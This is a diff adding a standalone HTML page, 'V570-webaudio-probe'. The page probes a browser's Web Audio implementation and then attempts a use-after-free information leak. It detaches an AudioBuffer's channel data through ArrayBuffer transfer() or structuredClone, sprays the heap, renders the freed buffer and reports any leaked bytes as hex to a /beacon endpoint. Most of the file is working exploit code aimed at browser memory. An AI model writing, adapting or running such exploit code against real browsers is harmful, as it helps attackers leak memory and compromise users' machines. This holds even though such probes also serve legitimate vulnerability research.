@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V570</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V570-'+tag+'?d='+encodeURIComponent(String(data).substring(0,500))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+function d2hex(d){
+  var f=new Float64Array(1);f[0]=d;
+  var u=new Uint8Array(f.buffer);
+  var h='';for(var i=7;i>=0;i--)h+=('0'+u[i].toString(16)).slice(-2);
+  return '0x'+h;
+}
+
+window.onerror=function(m,s,l,c){b('ONERROR',m+'|'+s+':'+l+':'+c)};
+b('BOOT','V570-webaudio-probe');
+
+try {
+
+// T1: AudioContext availability
+var ACtor = window.AudioContext || window.webkitAudioContext;
+b('T1', 'AudioContext='+(!!ACtor)+'|webkit='+(!!window.webkitAudioContext)+'|standard='+(!!window.AudioContext));
+
+if (!ACtor) {
+  b('T1-DEAD', 'NO AudioContext — Web Audio UNAVAILABLE');
+  b('DONE', 'V570-complete-no-audio');
+  throw 'STOP';
+}
+
+var actx;
+try {
+  actx = new ACtor();
+  b('T1A', 'created|state='+actx.state+'|sr='+actx.sampleRate+'|dest='+actx.destination.channelCount+'ch');
+} catch(e) {
+  b('T1A-FAIL', 'constructor threw: '+e.message);
+  b('DONE', 'V570-complete-ctor-fail');
+  throw 'STOP';
+}
+
+// T1B: Try resume (autoplay policy)
+try {
+  var resumeResult = actx.resume();
+  if (resumeResult && resumeResult.then) {
+    b('T1B', 'resume returned promise');
+  } else {
+    b('T1B', 'resume returned: '+resumeResult);
+  }
+} catch(e) {
+  b('T1B', 'resume threw: '+e.message);
+}
+
+// T2: OfflineAudioContext
+var OACtor = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+b('T2', 'OfflineAudioContext='+(!!OACtor)+'|webkit='+(!!window.webkitOfflineAudioContext));
+
+// T3: AudioBuffer creation + getChannelData
+var buf;
+try {
+  buf = actx.createBuffer(1, 4096, actx.sampleRate);
+  b('T3', 'buffer|ch='+buf.numberOfChannels+'|len='+buf.length+'|sr='+buf.sampleRate+'|dur='+buf.duration);
+} catch(e) {
+  b('T3-FAIL', 'createBuffer: '+e.message);
+}
+
+var chanData;
+if (buf) {
+  try {
+    chanData = buf.getChannelData(0);
+    b('T3A', 'chanData|type='+chanData.constructor.name+'|len='+chanData.length);
+    b('T3B', 'buffer='+chanData.buffer.constructor.name+'|byteLen='+chanData.buffer.byteLength);
+  } catch(e) {
+    b('T3A-FAIL', 'getChannelData: '+e.message);
+  }
+}
+
+// T4: Check if channel data ArrayBuffer is transferable
+if (chanData) {
+  var abuf = chanData.buffer;
+  b('T4', 'resizable='+(abuf.resizable||false)+'|detached='+(abuf.detached||false)+'|transfer='+(typeof abuf.transfer));
+
+  // Check structuredClone availability
+  b('T4A', 'structuredClone='+(typeof structuredClone)+'|postMessage='+(typeof postMessage));
+}
+
+// T5: AudioBufferSourceNode
+var src;
+try {
+  src = actx.createBufferSource();
+  b('T5', 'source|buffer='+src.buffer+'|loop='+src.loop+'|playbackRate='+src.playbackRate.value);
+} catch(e) {
+  b('T5-FAIL', 'createBufferSource: '+e.message);
+}
+
+// T6: AnalyserNode
+var analyser;
+try {
+  analyser = actx.createAnalyser();
+  analyser.fftSize = 2048;
+  b('T6', 'analyser|fftSize='+analyser.fftSize+'|freqBinCount='+analyser.frequencyBinCount+'|minDb='+analyser.minDecibels);
+} catch(e) {
+  b('T6-FAIL', 'createAnalyser: '+e.message);
+}
+
+// T7: GainNode (for routing)
+var gain;
+try {
+  gain = actx.createGain();
+  b('T7', 'gain|value='+gain.gain.value);
+} catch(e) {
+  b('T7-FAIL', 'createGain: '+e.message);
+}
+
+// T8: Test basic audio pipeline — write known pattern, play through offline, read back
+if (OACtor && buf) {
+  (function T8(){
+    try {
+      var offCtx = new OACtor(1, 4096, 44100);
+      var testBuf = offCtx.createBuffer(1, 4096, 44100);
+      var td = testBuf.getChannelData(0);
+      for (var i = 0; i < td.length; i++) td[i] = Math.sin(2 * Math.PI * 440 * i / 44100);
+
+      var testSrc = offCtx.createBufferSource();
+      testSrc.buffer = testBuf;
+      testSrc.connect(offCtx.destination);
+      testSrc.start(0);
+
+      offCtx.startRendering().then(function(rendered){
+        var rd = rendered.getChannelData(0);
+        var nz = 0;
+        for (var i = 0; i < rd.length; i++) if (rd[i] !== 0) nz++;
+        b('T8', 'rendered|len='+rd.length+'|nz='+nz+'|first5='+rd[0].toFixed(6)+','+rd[1].toFixed(6)+','+rd[2].toFixed(6)+','+rd[3].toFixed(6)+','+rd[4].toFixed(6));
+      }).catch(function(e){
+        b('T8-FAIL', 'render: '+e.message);
+      });
+    } catch(e) {
+      b('T8-FAIL', 'setup: '+e.message);
+    }
+  })();
+}
+
+// T9: Transfer() test on channel data ArrayBuffer
+// This is the CRITICAL test for the info leak primitive
+if (chanData) {
+  (function T9(){
+    var abuf = chanData.buffer;
+    b('T9', 'pre-transfer|detached='+(abuf.detached||'undef')+'|byteLen='+abuf.byteLength);
+
+    // Method 1: ArrayBuffer.prototype.transfer
+    if (typeof abuf.transfer === 'function') {
+      try {
+        var transferred = abuf.transfer();
+        b('T9A', 'transfer() OK|new-byteLen='+transferred.byteLength+'|old-detached='+(abuf.detached||'undef')+'|old-byteLen='+abuf.byteLength);
+        b('T9B', 'chanData-after|len='+chanData.length+'|byteLen='+chanData.buffer.byteLength);
+
+        // Check if AudioBuffer still works
+        try {
+          var cd2 = buf.getChannelData(0);
+          b('T9C', 'getChannelData-after|len='+cd2.length+'|byteLen='+cd2.buffer.byteLength);
+        } catch(e) {
+          b('T9C', 'getChannelData-after THREW: '+e.message);
+        }
+      } catch(e) {
+        b('T9A-FAIL', 'transfer threw: '+e.message);
+      }
+    } else {
+      b('T9A', 'transfer() NOT AVAILABLE');
+    }
+
+    // Method 2: structuredClone with transfer
+    if (typeof structuredClone === 'function' && chanData.buffer.byteLength > 0) {
+      try {
+        var cloned = structuredClone(chanData.buffer, {transfer: [chanData.buffer]});
+        b('T9D', 'structuredClone+transfer OK|cloned-byteLen='+cloned.byteLength+'|orig-byteLen='+chanData.buffer.byteLength);
+      } catch(e) {
+        b('T9D', 'structuredClone+transfer THREW: '+e.message);
+      }
+    } else {
+      b('T9D', 'structuredClone '+(typeof structuredClone)+' or buffer already detached');
+    }
+  })();
+}
+
+// T10: Independent transfer UAF attempt
+// Create fresh buffer, bind to source, transfer backing store, read through analyser
+if (actx && OACtor && src && analyser) {
+  (function T10(){
+    b('T10', 'starting independent transfer UAF test');
+    try {
+      var offCtx = new OACtor(1, 8192, 44100);
+
+      // Create buffer with known pattern
+      var leakBuf = offCtx.createBuffer(1, 8192, 44100);
+      var ld = leakBuf.getChannelData(0);
+      for (var i = 0; i < ld.length; i++) ld[i] = 0.5;
+      b('T10A', 'pattern written|len='+ld.length);
+
+      // Bind to source
+      var leakSrc = offCtx.createBufferSource();
+      leakSrc.buffer = leakBuf;
+
+      // Spray interesting data into heap BEFORE transfer
+      var heapSpray = [];
+      for (var i = 0; i < 100; i++) {
+        var ab = new ArrayBuffer(32768);
+        var dv = new DataView(ab);
+        for (var j = 0; j < 32768; j += 8) {
+          dv.setFloat64(j, 0xDEADBEEF + i + j/8, true);
+        }
+        heapSpray.push(ab);
+      }
+      b('T10B', 'heap spray done|count='+heapSpray.length);
+
+      // Try to transfer the channel data's backing store
+      var chanBuf = ld.buffer;
+      var transferred = false;
+      if (typeof chanBuf.transfer === 'function') {
+        try {
+          chanBuf.transfer();
+          transferred = true;
+          b('T10C', 'transfer() succeeded');
+        } catch(e) {
+          b('T10C', 'transfer() failed: '+e.message);
+        }
+      }
+      if (!transferred && typeof structuredClone === 'function') {
+        try {
+          structuredClone(chanBuf, {transfer: [chanBuf]});
+          transferred = true;
+          b('T10C2', 'structuredClone transfer succeeded');
+        } catch(e) {
+          b('T10C2', 'structuredClone transfer failed: '+e.message);
+        }
+      }
+
+      if (transferred) {
+        // Connect and render — source should read from freed backing store
+        leakSrc.connect(offCtx.destination);
+        leakSrc.start(0);
+
+        offCtx.startRendering().then(function(rendered){
+          var rd = rendered.getChannelData(0);
+          var nz = 0, nonHalf = 0;
+          var samples = [];
+          for (var i = 0; i < rd.length; i++) {
+            if (rd[i] !== 0) nz++;
+            if (rd[i] !== 0.5 && rd[i] !== 0) nonHalf++;
+            if (i < 20) samples.push(rd[i].toFixed(8));
+          }
+          b('T10D', 'rendered|nz='+nz+'|nonHalf='+nonHalf+'|len='+rd.length);
+          b('T10E', 'first20='+samples.join(','));
+          if (nonHalf > 0) {
+            // We got data that wasn't our 0.5 pattern or zero — potential leak!
+            var hexSamples = [];
+            for (var i = 0; i < Math.min(20, rd.length); i++) {
+              hexSamples.push(d2hex(rd[i]));
+            }
+            b('T10F', 'HEX-LEAK|'+hexSamples.join(','));
+          }
+        }).catch(function(e){
+          b('T10D-FAIL', 'render: '+e.message);
+        });
+      } else {
+        // Transfer failed — try the source.buffer=null approach
+        b('T10G', 'no transfer available, trying buffer=null');
+        try {
+          leakSrc.buffer = null;
+          b('T10G2', 'buffer=null succeeded');
+        } catch(e) {
+          b('T10G2', 'buffer=null failed: '+e.message);
+        }
+      }
+
+    } catch(e) {
+      b('T10-FAIL', 'error: '+e.message);
+    }
+  })();
+}
+
+// T11: Check ScriptProcessorNode (deprecated but may exist)
+try {
+  var sp = actx.createScriptProcessor(4096, 1, 1);
+  b('T11', 'ScriptProcessor=YES');
+} catch(e) {
+  b('T11', 'ScriptProcessor=NO|'+e.message);
+}
+
+// T12: Check AudioWorklet (modern API)
+try {
+  b('T12', 'AudioWorklet='+(!!actx.audioWorklet)+'|type='+(typeof actx.audioWorklet));
+} catch(e) {
+  b('T12', 'AudioWorklet check failed: '+e.message);
+}
+
+// T13: Check WaveShaperNode
+try {
+  var ws = actx.createWaveShaper();
+  b('T13', 'WaveShaper=YES|oversample='+ws.oversample);
+} catch(e) {
+  b('T13', 'WaveShaper=NO|'+e.message);
+}
+
+// T14: Check ConvolverNode
+try {
+  var conv = actx.createConvolver();
+  b('T14', 'Convolver=YES');
+} catch(e) {
+  b('T14', 'Convolver=NO|'+e.message);
+}
+
+} catch(e) {
+  if (e !== 'STOP') b('FATAL', ''+e.message+'|'+(e.stack||'').substring(0,200));
+}
+
+// Wait for async results
+setTimeout(function(){
+  b('DONE', 'V570-complete');
+}, 5000);
+</script>
+</body></html>
